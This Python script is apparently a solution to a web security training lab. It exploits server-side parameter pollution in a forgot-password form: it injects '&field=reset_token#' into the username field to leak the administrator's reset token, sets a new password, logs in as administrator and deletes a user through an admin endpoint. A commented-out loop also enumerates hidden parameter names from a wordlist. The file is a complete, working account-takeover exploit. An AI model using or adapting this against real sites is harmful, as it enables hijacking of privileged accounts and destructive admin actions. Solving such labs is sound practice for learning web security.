import requests
import urllib.parse
from pathlib import Path
from bs4 import BeautifulSoup
import json

def csrf_fetch(response):
    soup = BeautifulSoup(response, 'html.parser')
    csrf_token = soup.find('input', {'name': 'csrf'})['value']
    #print(csrf_token)
    return csrf_token

def set_post_data(var, csrf):
    payload = f"administrator&field={var}#"
    payload = urllib.parse.quote(payload)
    data={
        "csrf":csrf,
        "username":payload
    }
    return data

URL = "https://0ae100e1038d58a880bfe4cc0067007d.web-security-academy.net"
login_url = URL+"/login"
forgot_url = URL+"/forgot-password"

cwd = Path.cwd() 
print("Current Directory:", cwd)
file_path = cwd / "varname.txt" #path to Burp serverside variable name wordlist

client = requests.sessions.Session()
client.get(url=URL)
r = client.get(url=forgot_url)
if r.status_code != 200:
    print("coudln't connect successfuly")
    exit(-1)
csrf = csrf_fetch(r.text)

#commented out the variable name enumeration part:
"""
data = set_post_data("",csrf)
base_case = client.post(url=forgot_url, data=data) #setting base case with empty string at injection point
with open(file_path, "r") as varnames:
    for var in varnames:
        var = var.rstrip("\n ")
        data = set_post_data(var, csrf)
        r = client.post(url=forgot_url, data=data)
        print(f"status code = {r.status_code}\ntext:\n {r.text}\n")
        if r.status_code != base_case.status_code:
            print("code different!\n}")
            print(f"var: {var}, status code: {r.status_code}")
        if r.text != base_case.text:
            print("text different!\n}")
            print(f"var: {var}, text:\n {r.text}")
"""
#here you go and notice that there is a reset_token variable too, from
#the forgotpassword.js file

client.post(url=forgot_url, data = {"csrf":csrf,"username":"administrator"})
data = set_post_data("reset_token", csrf)
r = client.post(url=forgot_url, data = data)
token = json.loads(r.text)["result"]
new_pass = "foo"
reset_url = f"{forgot_url}?reset_token={token}"
csrf = csrf_fetch(client.get(url= reset_url).text)
reset_data = {
    "csrf":csrf,
    "reset_token":token,
    "new-password-1":new_pass,
    "new-password-2":new_pass
}
client.post(url = reset_url, data=reset_data)
csrf = csrf_fetch(client.get(url = login_url).text)
login_data = {
    "csrf":csrf,
    "username":"administrator",
    "password":new_pass
}
client.post(url=login_url, data=login_data)
print(f"{client.get(url=URL+ "/admin/delete?username=carlos").text}")